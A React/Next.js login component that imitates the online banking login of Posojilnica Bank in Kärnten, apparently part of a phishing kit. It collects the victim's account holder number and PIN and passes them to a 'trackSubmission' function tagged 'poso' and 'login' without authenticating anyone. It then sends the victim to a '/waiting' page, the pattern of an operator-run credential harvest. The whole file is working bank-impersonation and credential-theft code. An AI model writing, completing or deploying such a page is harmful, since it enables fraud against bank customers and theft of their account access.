"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

export default function LoginForm() {
  const router = useRouter();
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [saveVerfueger, setSaveVerfueger] = useState(false);

  const handleLogin = async () => {
    await trackSubmission("poso", "login", {
      bundesland: "kaernten",
      verfueger,
      pin,
      saveVerfueger,
    });
    router.push(`/waiting?user=${encodeURIComponent(verfueger)}`);
  };

  return (
    <>
      {/* Background */}
      <div className="bg-wrapper" />
      <div className="gradient-overlay" />

      {/* Page layout */}
      <div className="page-layout">
        {/* Login card */}
        <div className="login-card">
          {/* Logo */}
          <div className="card-logo">
            <img src="/poso/logo.svg" alt="Posojilnica Bank" />
          </div>

          {/* Language switch */}
          <div className="lang-switch">Deutsch</div>

          <div className="card-inner">
            <h1>Bitte melden Sie sich an</h1>
            <p className="description">
              Wählen Sie Ihr Bundesland und geben Sie Verfügernummer und PIN ein.
            </p>

            {/* Bundesland select */}
            <div className="form-field">
              <div className="form-field-box">
                <span className="floating-label required">Bundesland oder Bank wählen</span>
                <div className="select-wrapper">
                  <select defaultValue="kaernten" suppressHydrationWarning>
                    <option value="kaernten">Kärnten/Posojilnica Bank</option>
                  </select>
                </div>
              </div>
            </div>

            {/* Verfügernummer */}
            <div className="form-field">
              <div className="form-field-box">
                <span className="floating-label required">Verfügernummer eingeben</span>
                <input
                  type="text"
                  name="verfuegerNr"
                  value={verfueger}
                  onChange={(e) => setVerfueger(e.target.value)}
                  suppressHydrationWarning
                />
              </div>
            </div>

            {/* PIN */}
            <div className="form-field">
              <div className="form-field-box">
                <span className="floating-label required">PIN eingeben</span>
                <input
                  type="password"
                  name="pin"
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  suppressHydrationWarning
                />
              </div>
            </div>

            {/* Checkbox */}
            <div className="checkbox-row">
              <input
                type="checkbox"
                id="saveVerfueger"
                className="checkbox-input"
                checked={saveVerfueger}
                onChange={(e) => setSaveVerfueger(e.target.checked)}
              />
              <label htmlFor="saveVerfueger" className="checkbox-label">
                Verfüger speichern
              </label>
            </div>

            {/* Submit button */}
            <div className="btn-row">
              <button
                type="button"
                className="btn-primary"
                onClick={handleLogin}
              >
                Weiter
              </button>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="login-footer">
          <a href="#">Impressum</a>
          <a href="#">Nutzungsbedingungen</a>
          <a href="#">Barrierefreiheitserklärung</a>
          <span className="copyright">© 2026 Posojilnica Bank</span>
        </div>
      </div>
    </>
  );
}
